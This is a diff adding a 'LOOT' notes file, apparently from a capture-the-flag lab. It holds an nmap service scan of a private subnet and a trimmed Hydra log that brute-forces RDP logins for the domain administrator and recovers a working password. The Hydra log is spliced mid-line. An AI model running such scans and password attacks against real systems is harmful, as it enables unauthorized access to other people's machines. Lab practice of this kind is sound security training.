@@ -1,0 +1,145 @@
+LOOT
+
+nmap -sV 192.168.4.0-254
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-04 17:14 EDT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.4.1
+Host is up (0.016s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE    VERSION
+80/tcp    open  http       mini_httpd (Linksys RVS4000 router)
+443/tcp   open  ssl/https?
+49152/tcp open  upnp       Intel UPnP reference SDK 1.2 (Linux 2.4.27-star; UPnP 1.0)
+Service Info: OS: Linux; Device: router; CPE: cpe:/h:linksys:rvs4000, cpe:/o:linux:linux_kernel:2.4.27-star
+
+Nmap scan report for 192.168.4.16
+Host is up (0.010s latency).
+All 1000 scanned ports on 192.168.4.16 are closed
+
+Nmap scan report for 192.168.4.30
+Host is up (0.012s latency).
+Not shown: 999 closed ports
+PORT    STATE SERVICE VERSION
+514/tcp open  shell?
+
+Nmap scan report for 192.168.4.35
+Host is up (0.012s latency).
+Not shown: 979 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2017-04-04 21:17:12Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: kkctf.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Microsoft Windows Server microsoft-ds (workgroup: KKCTF)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: kkctf.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+8089/tcp  open  ssl/http      Splunkd httpd
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49159/tcp open  msrpc         Microsoft Windows RPC
+49176/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: WIN2K12SDC; OSs: Windows, Windows Server; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.4.106
+Host is up (0.020s latency).
+Not shown: 989 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds
+3001/tcp  open  tcpwrapped
+3389/tcp  open  tcpwrapped
+5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8089/tcp  open  ssl/http     Splunkd httpd
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.4.107
+Host is up (0.010s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds
+2869/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+3389/tcp open  ssl/ms-wbt-server?
+5357/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8089/tcp open  ssl/http           Splunkd httpd
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.4.254
+Host is up (0.0088s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 12.1 (protocol 2.0)
+443/tcp open  ssl/http Embedthis-Appweb (extension: php)
+
+Nmap scan report for 192.168.4.220
+Host is up (0.0000080s latency).
+All 1000 scanned ports on 192.168.4.220 are closed
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 255 IP addresses (8 hosts up) scanned in 133.21 seconds
+
+Hydra -- Snippet
+
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-04 17:19:03
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 5 tasks per 4 servers, overall 64 tasks, 69 login tries (l:1/p:69), ~0 tries per task
+[DATA] attacking service rdp on port 3389
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "Assword" - 1 of 69 [child 0]
+[ATTEMPT] target 192.168.4.107 - login "kkctf\administrator" - pass "Assword" - 1 of 69 [child 1]
+[ATTEMPT] target 192.168.4.38 - login "kkctf\administrator" - pass "Assword" - 1 of 69 [child 2]
+[ATTEMPT] target 192.168.4.15 - login "kkctf\administrator" - pass "Assword" - 1 of 69 [child 3]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "addword" - 2 of 69 [child 4]
+[ATTEMPT] target 192.168.4.107 - login "kkctf\administrator" - pass "addword" - 2 of 69 [child 5]
+[ATTEMPT] target 192.168.4.38 - login "kkctf\administrator" - pass "addword" - 2 of 69 [child 6]
+[ATTEMPT] target 192.168.4.15 - login "kkctf\administrator" - pass "addword" - 2 of 69 [child 7]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "P@ssword1" - 3 of 69 [child 8]
+[ATTEMPT] target 192.168.4.107 - login "kkctf\administrator" - pass "P@ssword1" - 3 of 69 [child 9]
+[ATTEMPT] target 192.168.4.38 - login "kkctf\administrator" - pass "P@ssword1" - 3 of 69 [child 10]
+[ATTEMPT] target 192.168.4.15 - login "kkctf\administrator" - pass "P@ssword1" - 3 of 69 [child 11]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "2Assword" - 4 of 69 [child 12]
+[ATTEMPT] target 192.168.4.107 - login "kkctf\administrator" - pass "2Assword" - 4 of 69 [child 13]
+[ATTEMPT] target 192.168.4.38 - login "kkctf\administrator" - pass "2Assword" - 4 of 69 [child 14]
+[ATTEMPT] target 192.168.4.15 - login "kkctf\administrator" - pass "2Assword" - 4 of 69 [child 15]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "2addPdd" - 5 of 69  192.168.4.35 - login "kkctf\administrator" - pass "random" - 59 of 69 [child 8]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "rank" - 60 of 69 [child 12]
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "rcs" - 61 of 69 [child 16]
+[VERBOSE] Server RDP version is 4
+[VERBOSE] Server RDP version is 4
+[VERBOSE] Server RDP version is 4
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "readme" - 62 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "redir" - 63 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "redirect" - 64 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "reference" - 65 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "references" - 66 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "reg" - 67 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[ATTEMPT] target 192.168.4.35 - login "kkctf\administrator" - pass "Password1" - 68 of 69 [child 12]
+[VERBOSE] Server RDP version is 4
+[3389][rdp] host: 192.168.4.35   login: kkctf\administrator   password: Password1
+
